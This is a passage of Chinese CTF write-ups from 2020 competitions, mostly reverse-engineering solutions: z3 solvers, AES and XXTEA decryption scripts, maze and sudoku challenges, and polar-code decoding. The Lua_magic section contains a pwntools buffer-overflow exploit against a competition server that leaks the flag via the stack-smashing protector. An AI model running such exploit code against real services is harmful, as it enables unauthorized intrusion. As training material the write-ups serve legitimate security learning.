VX&gt;=255addr:0x4ac Va = Vbaddr:0x4ae V8 = Vaaddr:0x4b0 Va = V9addr:0x4b2 Vb = V9addr:0x4b4 Vc = 02addr:0x4b6 Vb += Vc set VF=1 if VX&gt;=255addr:0x4b8 Va = Vbaddr:0x4ba V9 = Va 就是如下操作 12345678910f[0]+=2f[1]+=1f[2]=(f[2]+1)^1f[3]+=3f[4]+=2f[5]=(f[5]^2)+1f[6]=2*f[6]f[7]+=1f[8]=(f[8]^1)+1f[9]+=2 接下来是10个方程 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455addr:0x4bc Va = 00addr:0x4be Vb = Vaaddr:0x4c0 Vc = V0addr:0x4c2 Vd = 01addr:0x4c4 set I=Veaddr:0x4c6 store V0-Ve to addr start at Iaddr:0x4c8 Vf = 03addr:0x4ca Ve += Vf set VF=1 if VX&gt;=255addr:0x4cc V0 = Vcaddr:0x4ce V1 = Vdaddr:0x4d0 call 27aaddr:0x4d2 Vc = Vfaddr:0x4d4 Vb += Vc set VF=1 if VX&gt;=255addr:0x4d6 Va = Vbaddr:0x4d8 Vb = Vaaddr:0x4da Vc = V1addr:0x4dc Vd = 02addr:0x4de set I=Veaddr:0x4e0 store V0-Ve to addr start at Iaddr:0x4e2 Vf = 03addr:0x4e4 Ve += Vf set VF=1 if VX&gt;=255addr:0x4e6 V0 = Vcaddr:0x4e8 V1 = Vdaddr:0x4ea call 27aaddr:0x4ec Vc = Vfaddr:0x4ee Vb += Vc set VF=1 if VX&gt;=255addr:0x4f0 Va = Vbaddr:0x4f2 Vb = Vaaddr:0x4f4 Vc = V2addr:0x4f6 Vd = 01addr:0x4f8 set I=Veaddr:0x4fa store V0-Ve to addr start at Iaddr:0x4fc Vf = 03addr:0x4fe Ve += Vf set VF=1 if VX&gt;=255addr:0x500 V0 = Vcaddr:0x502 V1 = Vdaddr:0x504 call 27aaddr:0x506 Vc = Vfaddr:0x508 Vb += Vc set VF=1 if VX&gt;=255addr:0x50a Va = Vbaddr:0x50c Vb = Vaaddr:0x50e Vc = 21addr:0x510 Vf = 00addr:0x512 Skips the next instruction if Vb equals Vcaddr:0x514 Vf = 01addr:0x516 Vb = Vfaddr:0x518 Skips the next instruction if Vb not equals 00addr:0x51a jmp 52eaddr:0x51c clear screenaddr:0x51e Vb = Vfaddr:0x520 set I=Veaddr:0x522 store V0-Ve to addr start at Iaddr:0x524 Vf = 03addr:0x526 Ve += Vf set VF=1 if VX&gt;=255addr:0x528 call 202 202函数为输出dead函数，需要跳过，传入27a中寄存器Vd的值表示多项式前该项的系数，三个三个一组可以列出10个方程，写脚本z3求解 1234567891011121314151617181920212223242526272829303132333435from z3 import *def RecurOr(flags, models, pos=0): if pos &lt;= len(flags) - 1: return Or(models[flags[pos]] != flags[pos], RecurOr(flags, models, pos + 1)) else: return Or(models[flags[pos]] != flags[pos])f = [Int('v%d' % i) for i in range(9)]flag = []solver = Solver()for c in f: solver.add(c &gt;= 0x0) solver.add(c &lt;= 0xff)solver.add(f[0] + 2 * f[1] + f[2] == 0x21)solver.add(2 * f[0] + f[1] + f[2] == 0x2a)solver.add(f[0] + 2 * f[1] + 2 * f[2] == 0x30)solver.add(f[3] + 2 * f[4] + f[5] == 0x37)solver.add(2 * f[3] + f[4] + f[5] == 0x37)solver.add(f[3] + 2 * f[4] + 2 * f[5] == 0x3b)solver.add(f[6] + 2 * f[7] + f[8] == 0x1f)solver.add(2 * f[6] + f[7] + f[8] == 0x16)solver.add(f[6] + 2 * f[7] + 2 * f[8] == 0x20)while solver.check() == sat: model = solver.model() ff = [model[f[0]].as_long() - 2, model[f[1]].as_long() - 1, (model[f[2]].as_long() ^ 1) - 1, model[f[3]].as_long() - 3, model[f[4]].as_long() - 2, (model[f[5]].as_long() - 1) ^ 2, model[f[6]].as_long() // 2, model[f[7]].as_long() - 1, (model[f[8]].as_long() - 1) ^ 1, 5 - 2] print(ff) solver.add(RecurOr(f, model))# a2def12c13 两部分都得到，拼起来提交正确 1flag{6c8f1d78770fe672122478c6f9a150e8a2def12c13}","link":"/2020/08/28/2020-08-28-2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/"},{"title":"2020-钓鱼城杯-wp","text":"2020-钓鱼城杯 rereg打开程序发现调用方式很奇怪，调试直接运行然后暂停通过stack trace找到输入函数，以宽字符输入然后处理成字符串，接着生成了两串数据，在这里绕了很久，总在找生成逻辑，实际上生成的数和输入没有关系，每次运行都会生成同样的数 12e3dfb24a5553edac13ff65ac7b5f3170 9d25dde0c137862132ec0c324cfbf046 发现之后接着调试，程序调用了wincrypt的API用来加密，根据传入的数据查到AES加密，整个程序的逻辑为，用生成的两串数作为iv和key，输入作为明文，输出经过base64编码之后显示到终端并写入到文件里，所以直接解密即可 12345678910111213141516171819202122232425from Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_hexdef add_to_16(text): if len(text.encode('utf-8')) % 16: add = 16 - (len(text.encode('utf-8')) % 16) else: add = 0 text = text + ('\\0' * add) return text.encode('utf-8')def decrypt(text): key = b\"\\xe3\\xdf\\xb2\\x4a\\x55\\x53\\xed\\xac\\x13\\xff\\x65\\xac\\x7b\\x5f\\x31\\x70\" iv = b\"\\x9d\\x25\\xdd\\xe0\\xc1\\x37\\x86\\x21\\x32\\xec\\x0c\\x32\\x4c\\xfb\\xf0\\x46\" mode = AES.MODE_CBC cryptos = AES.new(key, mode, iv) plain_text = cryptos.decrypt(a2b_hex(text)) return plain_textif __name__ == '__main__': d = decrypt( b\"F10014173233C3482DACB7915297AC89E45781087077C39F4F00C832B6C12DA6D2C75E4133CE84FB6440B10FD124A72A\") print(\"解密:\", d)# b'flag{this_flag_not_beyr_f81_8837fu8}\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c'","link":"/2020/08/28/2020-08-28-2020-%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF-wp/"},{"title":"2020-DDCTF","text":"这次re全是安卓，后面两题连脱壳的环境都没搭好…… re1安卓逆向，但是没加壳，很容易找到判断的逻辑，两层加密最后经过一层md5，后来更新提示把md5之前的结果给出来了，就很好逆了。 整个程序流程是一个AES加密之后进行XXTEA加密，只是AES的S盒经过了处理，逆回来就可以发现是AES的S盒，直接上脚本解密就好了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from Crypto.Cipher import AESfrom binascii import a2b_hex_DELTA = 0x9E3779B9def decrypt_xxtea(str): if str == '': return str v = str k = [2, 2, 3, 4] n = len(v) - 1 z = v[n] y = v[0] q = 6 + 52 // (n + 1) sum = (q * _DELTA) &amp;amp; 0xffffffff while (sum != 0): e = sum &gt;&gt; 2 &amp;amp; 3 for p in range(n, 0, -1): z = v[p - 1] v[p] = (v[p] - ((z &gt;&gt; 5 ^ y &amp;lt;&amp;lt; 2) + (y &gt;&gt; 3 ^ z &amp;lt;&amp;lt; 4) ^ (sum ^ y) + (k[p &amp;amp; 3 ^ e] ^ z))) &amp;amp; 0xffffffff y = v[p] z = v[n] v[0] = (v[0] - ((z &gt;&gt; 5 ^ y &amp;lt;&amp;lt; 2) + (y &gt;&gt; 3 ^ z &amp;lt;&amp;lt; 4) ^ (sum ^ y) + (k[0 &amp;amp; 3 ^ e] ^ z))) &amp;amp; 0xffffffff y = v[0] sum = (sum - _DELTA) &amp;amp; 0xffffffff return vt = [0x15ef75f4, 0xc4277b7a, 0xe7f4412d, 0x78e78345, 0xecf16de2, 0xd5d29477, 0x2169b3a0, 0x2a685baa]target = decrypt_xxtea(t)s = \"\"for i in target: tmp = hex(i)[2:].rjust(8, '0') s += tmp[-2:] s += tmp[-4:-2] s += tmp[-6:-4] s += tmp[-8:-6]s = s.encode()def decrypt(text): key = b\"1234567890123456\" # iv = b\"\\x9d\\x25\\xdd\\xe0\\xc1\\x37\\x86\\x21\\x32\\xec\\x0c\\x32\\x4c\\xfb\\xf0\\x46\" mode = AES.MODE_ECB cryptos = AES.new(key, mode) plain_text = cryptos.decrypt(a2b_hex(text)) return plain_textd = decrypt(s)print(\"解密:\", d)# 解密: b'DDCTF{qazasd1234$}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' 得到flag","link":"/2020/09/08/2020-09-08-2020-DDCTF/"},{"title":"2020-ciscn 西北赛区分区赛","text":"2020-ciscn 西北赛区分区赛 Lua_magic程序先读取了一个lua脚本，跑三次循环，每次输入两个数，根据这两个数算出一个新的数字和生成的随机数比较，如果相同进行下一次验证，不同直接退出Random函数在之前没有设置种子，所以是个伪随机数，所以只需要知道运算的过程就可以了，但是一开始没有给lua文件，只能盲打，输入几个数字之后发现，第一个数来选择用于运算的数，然后和第二个数异或，得到最终的结果，先在linux环境下写个程序生成随机数默认第一个数输入0，根据异或出来的结果构造三个数字，绕过前面的检验，但是最后读入flag文件之后没有输出，最后一个read存在溢出，开启了cannary保护，直接利用ssp输出flag值 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *localfile = \"./Lua_magic\"locallibc = '/lib/x86_64-linux-gnu/libc.so.6'remotelibc = locallibclocal = Falseif local: io = process(localfile) libc = ELF(locallibc) elf = ELF(localfile)else: io = remote('172.1.13.17', 8888) libc = ELF(remotelibc) elf = ELF(localfile)# context.log_level = 'debug'context.arch = elf.archse = lambda data: io.send(data)sa = lambda delim, data: io.sendafter(delim, data)sl = lambda data: io.sendline(data)sla = lambda delim, data: io.sendlineafter(delim, data)sea = lambda delim, data: io.sendafter(delim, data)rc = lambda numb=4096: io.recv(numb)ru = lambda delims, drop=True: io.recvuntil(delims, drop)info_addr = lambda tag, addr: io.info(tag + ': {:#x}'.format(addr))uu32 = lambda data: u32(data.ljust(4, '\\0'))uu64 = lambda data: u64(data.ljust(8, '\\0'))def debug(cmd=''): gdb.attach(io, cmd)# info# gadget# shellcode# ropio=remote(\"172.1.13.17\",8888)ru(\"heart;)\\n\")sl(\"0 1808823121\")ru(\"who am I?\\n\")print io.recv()sl(\"0 840963568\")ru(\"who am I?\\n\")print io.recv()sl(\"0 1684516447\")ru(\"who am I?\\n\")print io.recv()sl(p64(0x602140)*35)print io.recv()#debug('b *0x0000000000400766')io.interactive() Gameover先读取随机数，然后转换成了16进制字符串，之后列出菜单输入选项，1是查看密文，7是最后一步验证，其他的字符都是进行一步输入，绕过最后一步验证之后就可以拿到shell，最后一个验证比较开始读取的随机数和最后一次输入是否相同中间加密过程进行了一些大数运算，关键运算在于BN_mod_exp，表示(v13**v12) mod v11，其中v11是中间一串大数，尝试分解发现很难分解，猜测是大素数之积，v13是我们需要知道的随机数也就是明文，整个加密的过程就是rsa，这里发现，因为同在bss段上，可以利用菜单2的输入覆盖掉v12的值，也就是构造相同m、相同n、不同e生成的两条密文，存在共模攻击，可以直接算出明文也就是最后需要的输入","link":"/2020/09/19/2020-09-19-2020-ciscn_%E8%A5%BF%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B/"},{"title":"2020-巅峰极客","text":"2020-巅峰极客 revirus简单的迷宫题，开始先输入四个数选择地图顺序，然后输入以wasd组成的操作序列，用-隔开，每一个序列都会有长度限制，对应了四个迷宫不同的路线长度，所以把迷宫找出来就解出来了 123456789101112131415161718192021maze1|||||||||||||||||||||||||||||||||||||||||||||||s………||||||||||||||.|||||d||||||||.|||||.||||||||.|||||.||||||||.|||||……….|||||||||||||||||| start (3,2) a2=1 dddddddddsssssaaaaaaaaawww len=26 123456789101112131415161718192021maze2|||||||||||||||||||||s|||||||||||||d||||..|||||||||||..|||||..|||||||||..|||||||..|||||||..|||||||||..|||||..|||||||||||..|||..|||||||||||||..|..|||||||||||||||…||||||||||||||||||||||||||| start (1,2) a2=2 sdsdsdsdsdsdsddwdwdwdwdwdwdw len=28 123456789101112131415161718192021maze3|||||||||||||||||………s|||||.||||||||||||||.||||||||||||||.||||||||||||||.||||||||||||||.||||||||||||||.||||||||||||||………d|||||||||||||||||| start (1,B) a2=3 aaaaaaaaasssssssddddddddd len=25 123456789101112131415161718192021maze4||||||||||||||||||||||||||||||||||||||||||||||||……….|||||.||||||||.|||||.||||||||.|||||.||||||||.|||||.||||||||.|||||s||||||||d||||||||||||||||| start (8,3) a2=4 wwwwwdddddddddsssss len=19 长度顺序为19 25 26 28，所以对应的结果如下： 4312-wwwwwdddddddddsssss-aaaaaaaaasssssssddddddddd-dddddddddsssssaaaaaaaaawww-sdsdsdsdsdsdsddwdwdwdwdwdwdw 套上flag即可 fu!k_py这题也比较简单，没什么好说的，解压得到的pyc文件没有任何修改，可以直接uncompyle 123456789101112131415161718192021222324252627282930313233343536373839(lambda __g, __print: [ [ (lambda __after: [ (lambda __after: (__print('Error len!'), (exit(), __after())[1])[1] if len(input) != 87 else __after())(lambda : [ [ [ [ (lambda __after: (__print('Error fmt!'), (exit(0), __after())[1])[1] if fmt1 != 'flag{' or fmt2 != '}' else __after())(lambda : (d.append(context[0:9]), (d.append(context[9:18]), (d.append(context[18:27]), (d.append(context[27:36]), (d.append(context[36:45]), (d.append(context[45:54]), (d.append(context[54:63]), (d.append(context[63:72]), (d.append(context[72:81]), [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if d[0][2] != '5' or d[0][3] != '3' else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if d[1][0] != '8' or d[1][7] != '2' else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if d[2][1] != '7' or d[2][4] != '1' or d[2][6] != '5' else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if d[3][0] != '4' or d[3][5] != '5' or d[3][6] != '3' else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if d[4][1] != '1' or d[4][4] != '7' or d[4][8] != '6' else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if d[5][2] != '3' or d[5][3] != '2' or d[5][7] != '8' else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if d[6][1] != '6' or d[6][3] != '5' or d[6][8] != '9' else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if d[7][2] != '4' or d[7][7] != '3' else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if d[8][5] != '9' or d[8][6] != '7' else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if check(h1) != 45 or check(h2) != 45 or check(h3) != 45 or check(h4) != 45 or check(h5) != 45 or check(h6) != 45 or check(h7) != 45 or check(h8) != 45 or check(h9) != 45 else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if check(l1) != 45 or check(l2) != 45 or check(l3) != 45 or check(l4) != 45 or check(l5) != 45 or check(l6) != 45 or check(l7) != 45 or check(l8) != 45 or check(l9) != 45 else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if check(k1) != 45 or check(k2) != 45 or check(k3) != 45 or check(k4) != 45 or check(k5) != 45 or check(k6) != 45 or check(k7) != 45 or check(k8) != 45 or check(k9) != 45 else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if check1(h1) != 1 or check1(h2) != 1 or check1(h3) != 1 or check1(h4) != 1 or check1(h5) != 1 or check1(h6) != 1 or check1(h7) != 1 or check1(h8) != 1 or check1(h9) != 1 else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if check1(l1) != 1 or check1(l2) != 1 or check1(l3) != 1 or check1(l4) != 1 or check1(l5) != 1 or check1(l6) != 1 or check1(l7) != 1 or check1(l8) != 1 or check1(l9) != 1 else __after())(lambda : (lambda __after: (__print('Error!'), (exit(), __after())[1])[1] if check1(k1) != 1 or check1(k2) != 1 or check1(k3) != 1 or check1(k4) != 1 or check1(k5) != 1 or check1(k6) != 1 or check1(k7) != 1 or check1(k8) != 1 or check1(k9) != 1 else __after())(lambda : (__print('Yes! You got it!'), __after())[1]))))))))))))))) for __g['k9'] in [context[60] + context[61] + context[62] + context[69] + context[70] + context[71] + context[78] + context[79] + context[80]] ][0] for __g['k8'] in [context[57] + context[58] + context[59] + context[66] + context[67] + context[68] + context[75] + context[76] + context[77]] ][0] for __g['k7'] in [context[54] + context[55] + context[56] + context[63] + context[64] + context[65] + context[72] + context[73] + context[74]] ][0] for __g['k6'] in [context[33] + context[34] + context[35] + context[42] + context[43] + context[44] + context[51] + context[52] + context[53]] ][0] for __g['k5'] in [context[30] + context[31] + context[32] + context[39] + context[40] + context[41] + context[48] + context[49] + context[50]] ][0] for __g['k4'] in [context[27] + context[28] + context[29] + context[36] + context[37] + context[38] + context[45] + context[46] + context[47]] ][0] for __g['k3'] in [context[6] + context[7] + context[8] + context[15] + context[16] + context[17] + context[24] + context[25] + context[26]] ][0] for __g['k2'] in [context[3] + context[4] + context[5] + context[12] + context[13] + context[14] + context[21] + context[22] + context[23]] ][0] for __g['k1'] in [context[0] + context[1] + context[2] + context[9] + context[10] + context[11] + context[18] + context[19] + context[20]] ][0] for __g['l9'] in [context[8] + context[17] + context[26] + context[35] + context[44] + context[53] + context[62] + context[71] + context[80]] ][0] for __g['l8'] in [context[7] + context[16] + context[25] + context[34] + context[43] + context[52] + context[61] + context[70] + context[79]] ][0] for __g['l7'] in [context[6] + context[15] + context[24] + context[33] + context[42] + context[51] + context[60] + context[69] + context[78]] ][0] for __g['l6'] in [context[5] + context[14] + context[23] + context[32] + context[41] + context[50] + context[59] + context[68] + context[77]] ][0] for __g['l5'] in [context[4] + context[13] + context[22] + context[31] + context[40] + context[49] + context[58] + context[67] + context[76]] ][0] for __g['l4'] in [context[3] + context[12] + context[21] + context[30] + context[39] + context[48] + context[57] + context[66] + context[75]] ][0] for __g['l3'] in [context[2] + context[11] + context[20] + context[29] + context[38] + context[47] + context[56] + context[65] + context[74]] ][0] for __g['l2'] in [context[1] + context[10] + context[19] + context[28] + context[37] + context[46] + context[55] + context[64] + context[73]] ][0] for __g['l1'] in [context[0] + context[9] + context[18] + context[27] + context[36] + context[45] + context[54] + context[63] + context[72]] ][0] for __g['h9'] in [context[72:81]] ][0] for __g['h8'] in [context[63:72]] ][0] for __g['h7'] in [context[54:63]] ][0] for __g['h6'] in [context[45:54]] ][0] for __g['h5'] in [context[36:45]] ][0] for __g['h4'] in [context[27:36]] ][0] for __g['h3'] in [context[18:27]] ][0] for __g['h2'] in [context[9:18]] ][0] for __g['h1'] in [context[0:9]] ][0] )[1])[1])[1])[1])[1])[1])[1])[1])[1]) for **g['d'] in [[]] ][0] for __g['context'] in [input[5:-1]] ][0] for __g['fmt2'] in [input[(-1)]] ][0] for __g['fmt1'] in [input[0:5]] ][0]) for __g['input'] in [raw_input('Input your flag:')] ][0] if __name** == '**main**' else **after())(lambda : None) for __g['check1'], check1.__name** in [(lambda arg: (lambda **l: [ (lambda __after: 0 if len(list(set(__l['arg']))) != 9 else 1)(lambda : None) for __l['arg'] in [arg] ][0])({}), 'check1')] ][0] for __g['check'], check.__name** in [(lambda arg: (lambda **l: [ sum(map(int, __l['arg'])) for __l['arg'] in [arg] ][0])({}), 'check')] ][0])(globals(), __import**('**builtin**', level=0).**dict**['print']) 代码可读性很差，但是可以大概了解一下信息，一共输入81位，某些特定的位数上的数字是确定的，其中定义了一些变量，可以很轻易看出来分别是行、列和九宫格，两个check也很清晰，查每行每列每个九宫格有无重复数字，查和是否为45，这很显然是一个数独，直接解就可以了。","link":"/2020/09/26/2020-09-26-2020-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"},{"title":"2020-全国工业互联网安全技术技能大赛","text":"2020-全国工业互联网安全技术技能大赛 5G考查polar编码 123456789101112131415161718192021222324252627282930313233sub_401FD0(); v3 = time(0); srand(v3); memset(&amp;v32, 0, 0x80u); v30 = (char *)malloc(dword_40F040 + 1); sub_40E540(\"%64s\", &amp;v32); v26 = (signed int)(double)sub_4029B0((long double)dword_40F040); v29 = dword_40F040; v4 = 4 * (dword_40F040 / 2); v31 = dword_40F040 / 2; v5 = malloc(4 * (dword_40F040 / 2)); v28 = malloc(v4); memcpy(v5, &amp;dword_40F080, v4); memcpy(v28, (char *)&amp;dword_40F080 + v4, v4); v6 = 0; v27 = malloc(4 * v29); memset(v27, 0, 4 * v29); v7 = v30; do { LOBYTE(v8) = *((_BYTE *)&amp;v32 + v6); v9 = 0; do { v10 = v8 &amp; 1; v8 = (unsigned int)(char)v8 &gt;&gt; 1; v7[v9++] = v10; } while ( v9 != 8 ); ++v6; v7 += 8; } while ( v6 != 64 ); main函数开始先输入64个字符，然后转换成比特，共512位，进行编码和传输，题目中给了输出可以根据输出进行解码求输入，解码部分根据提示利用开源代码https://github.com/albusSimba/pyPolar实现，但是解码出来的数据位数是1024位，在编码最开始赋值的时候还有一个类似于换表的操作，将512位数据打乱写入1024位的矩阵中，所以解码的时候还需要提取出输入的512位，才可以得到最终结果 12345678910111213141516171819202122232425from QueryPerformanceCounter import *from polarcodes5G import *​n = 1024k = n // 2performance_counter = QueryPerformanceCounter()myPC = Construct(n, k)s = \"-1.756208 1.027628 -0.952465 -1.638855 -1.462390 0.208588 0.591268 -0.179454 1.095095 0.447900 0.947692 1.350273 -1.155633 -1.938154 0.046054 1.175568 -0.007052 1.220866 1.890119 1.539061 0.677526 -0.493938 1.113000 1.148966 0.437962 -1.025365 -1.001201 -0.274902 0.545109 -1.125495 -1.112381 0.214771 0.635569 …………\"t = [float(i) for i in s.split(\" \")]myPC.llrs = np.array(t)performance_counter.start()Decoder(myPC)performance_counter.end(\"Decoder\")res = list(myPC.message_received)bits = list(myPC.msg_bits)f = [0] * 512for i, c in enumerate(bits): f[i] = res[c]for i in range(0, 512, 8): ch = 0 for j in range(8): ch += (f[i + j] &amp;lt;&amp;lt; j) &amp;amp; 0xff print(chr(ch), end=\"\")​# Congratz!Your_flag_is:flag{632828e1-5b6f-4bae-9320-a2808d193a23}","link":"/2020/10/24/2020-10-24-2020-%E5%85%A8%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"},{"title":"36DCTF-wp","text":"2020-36DCTF easyreIDA打开是下面这个样子 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788int __cdecl main(int argc, const char **argv, const char **envp){ __int64 v3; // rdx __int64 v4; // rcx int v6; // [rsp+4h] [rbp-8Ch] unsigned int v7; // [rsp+8h] [rbp-88h] int v8; // [rsp+Ch] [rbp-84h] int v9; // [rsp+10h] [rbp-80h] int v10; // [rsp+14h] [rbp-7Ch] int v11; // [rsp+18h] [rbp-78h] int v12; // [rsp+1Ch] [rbp-74h] int v13; // [rsp+20h] [rbp-70h] int v14; // [rsp+24h] [rbp-6Ch] int v15; // [rsp+28h] [rbp-68h] int v16; // [rsp+2Ch] [rbp-64h] int v17; // [rsp+30h] [rbp-60h] int v18; // [rsp+34h] [rbp-5Ch] int v19; // [rsp+38h] [rbp-58h] int v20; // [rsp+3Ch] [rbp-54h] int v21; // [rsp+40h] [rbp-50h] int v22; // [rsp+44h] [rbp-4Ch] int v23; // [rsp+48h] [rbp-48h] int v24; // [rsp+4Ch] [rbp-44h] int v25; // [rsp+50h] [rbp-40h] int v26; // [rsp+54h] [rbp-3Ch] int v27; // [rsp+58h] [rbp-38h] int v28; // [rsp+5Ch] [rbp-34h] int v29; // [rsp+60h] [rbp-30h] int v30; // [rsp+64h] [rbp-2Ch] int v31; // [rsp+68h] [rbp-28h] int v32; // [rsp+6Ch] [rbp-24h] int v33; // [rsp+70h] [rbp-20h] int v34; // [rsp+74h] [rbp-1Ch] int v35; // [rsp+78h] [rbp-18h] int v36; // [rsp+7Ch] [rbp-14h] int v37; // [rsp+80h] [rbp-10h] int v38; // [rsp+84h] [rbp-Ch] int v39; // [rsp+88h] [rbp-8h] char v40; // [rsp+8Ch] [rbp-4h] v9 = 102; v10 = 109; v11 = 99; v12 = 98; v13 = 127; v14 = 58; v15 = 85; v16 = 106; v17 = 57; v18 = 82; v19 = 122; v20 = 55; v21 = 81; v22 = 19; v23 = 51; v24 = 35; v25 = 67; v26 = 70; v27 = 41; v28 = 61; v29 = 41; v30 = 32; v31 = 127; v32 = 28; v33 = 38; v34 = 77; v35 = 49; v36 = 20; v37 = 80; v38 = 94; v39 = 0xFFFFFFE8; sub_4007F8((__int64)&amp;v40, 0LL, 4LL); v7 = 0; v6 = 0; sub_400808((__int64)aFlag); do { v8 = sub_400818((__int64)aFlag, 0LL); v6 |= v8 ^ v7 ^ (v7 + (v7 ^ *(&amp;v9 + (signed int)v7))); v4 = v7++; } while ( v8 &amp;&amp; v8 != 10 &amp;&amp; v8 != -1 ); if ( v6 ) sub_400828(aFailed, 0LL, v3, v4); else sub_400828(aCorrect, 0LL, v3, v4); return 0;} 很简单，写个脚本就出来了，签到成功 1234567target = [102, 109, 99, 98, 127, 58, 85, 106, 57, 82, 122, 55, 81, 19, 51, 35, 67, 70, 41, 61, 41, 32, 127, 28, 38, 77, 49, 20, 80, 94]flag = \"\"for i in range(len(target)): flag += chr(i ^ (i + (i ^ target[i])))print(flag)# flag{A_s1mpLe&amp;E4sy_RE_i5Nt_1t} 神光IDA打开，根据提示语找到关键函数 1234567891011121314151617181920212223242526272829303132333435363738394041int __usercall sub_415C10@&lt;eax&gt;(int a1@&lt;xmm0&gt;, int a2@&lt;ebx&gt;){ int v2; // eax int v3; // edx int v4; // ecx int v5; // eax int v6; // edx int v7; // ecx int v8; // ecx int v9; // eax int v10; // edx int v11; // ecx int v12; // edx int v13; // ST0C_4 char v15; // [esp+0h] [ebp-ECh] char input1; // [esp+D0h] [ebp-1Ch] int v17; // [esp+E8h] [ebp-4h] int savedregs; // [esp+ECh] [ebp+0h] sub_41122B((int)&amp;unk_41C032); sub_411406(); while ( 1 ) { printf((int)\"请输入key:\\n\", v15); scanf((const char *)&amp;unk_417B40, (unsigned int)&amp;input1, 20); sub_4113B1(a1, &amp;input1); if ( target1 ) break; v2 = puts(\"系统错误,请再试一次\\n\"); sub_411235(v4, v3, &amp;v15 == &amp;v15, v2, a1); } sub_41141A(a1); v5 = MessageBoxA(0, \"认证成功,离flag又近了一步\", \"恭喜\", 0); sub_411235(v7, v6, &amp;v15 == &amp;v15, v5, a1); sub_4113CF(a1, v8, a2, (int)&amp;v15, &amp;input1); v9 = system(\"pause\"); sub_411235(v11, v10, &amp;v15 == &amp;v15, v9, a1); v13 = v12; sub_411258((int)&amp;savedregs, (int)byte_415D18); return sub_411235((unsigned int)&amp;savedregs ^ v17, v13, 1, 0, a1);} 输入key之后在下面的函数里进行验证 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465int __usercall sub_415B10@&lt;eax&gt;(int a1@&lt;xmm0&gt;, char *input1){ int v2; // eax int v3; // edx int v4; // eax int v5; // edx int v6; // ecx int v7; // eax __int64 v8; // rtt int v9; // ST04_4 int v10; // ST00_4 int v12; // [esp+0h] [ebp-E8h] char Str2; // [esp+D0h] [ebp-18h] char v14; // [esp+D1h] [ebp-17h] char v15; // [esp+D2h] [ebp-16h] char v16; // [esp+D3h] [ebp-15h] char v17; // [esp+D4h] [ebp-14h] char v18; // [esp+D5h] [ebp-13h] char v19; // [esp+D6h] [ebp-12h] char v20; // [esp+D7h] [ebp-11h] char v21; // [esp+D8h] [ebp-10h] char v22; // [esp+D9h] [ebp-Fh] char v23; // [esp+DAh] [ebp-Eh] char v24; // [esp+DBh] [ebp-Dh] char v25; // [esp+DCh] [ebp-Ch] char v26; // [esp+DDh] [ebp-Bh] char v27; // [esp+DEh] [ebp-Ah] int v28; // [esp+E4h] [ebp-4h] int savedregs; // [esp+E8h] [ebp+0h] sub_41122B((int)&amp;unk_41C032); Str2 = 'w'; v14 = 'a'; v15 = 'n'; v16 = 'g'; v17 = 'z'; v18 = 'h'; v19 = 'e'; v20 = 'r'; v21 = 'o'; v22 = 'n'; v23 = 'g'; v24 = 'y'; v25 = 'a'; v26 = 'o'; v27 = 0; v2 = j_strcmp(input1, &amp;Str2); if ( v2 ) { target1 = 0; } else { v4 = rand(); v7 = sub_411235(v6, v5, &amp;v12 == &amp;v12, v4, a1); v8 = v7; v2 = v7 / 10; v3 = v8 % 10; target1 = v8 % 10; } v9 = v3; v10 = v2; sub_411258((int)&amp;savedregs, (int)dword_415BEC); return sub_411235((unsigned int)&amp;savedregs ^ v28, v9, 1, v10, a1);} 输入的key应该是wangzherongyao 12345678910111213141516171819202122232425262728293031323334353637int __usercall sub_415770@&lt;eax&gt;(int a1@&lt;xmm0&gt;, int a2@&lt;ecx&gt;, int a3@&lt;ebx&gt;, int a4@&lt;esi&gt;, char *Str){ size_t v5; // eax int v6; // eax int v7; // edx int v8; // ecx char v10; // [esp+0h] [ebp-15D8h] int j; // [esp+610h] [ebp-FC8h] unsigned int i; // [esp+61Ch] [ebp-FBCh] int v13; // [esp+15C4h] [ebp-14h] int v14; // [esp+15C8h] [ebp-10h] int v15; // [esp+15D0h] [ebp-8h] int savedregs; // [esp+15D8h] [ebp+0h] sub_4113ED(0x15D8u, a2); memset(&amp;v10, 0xCCu, 0x15D8u); sub_41122B((int)&amp;unk_41C032); v15 = 0; for ( i = 0; ; ++i ) { v5 = j_strlen(Str); if ( i &gt;= v5 ) break; v15 += Str[i]; } for ( j = 0; j &lt; 38; ++j ) { step2[j] += v15; step2[j] ^= dword_41A4DC; } step2[++j] = 0; v6 = 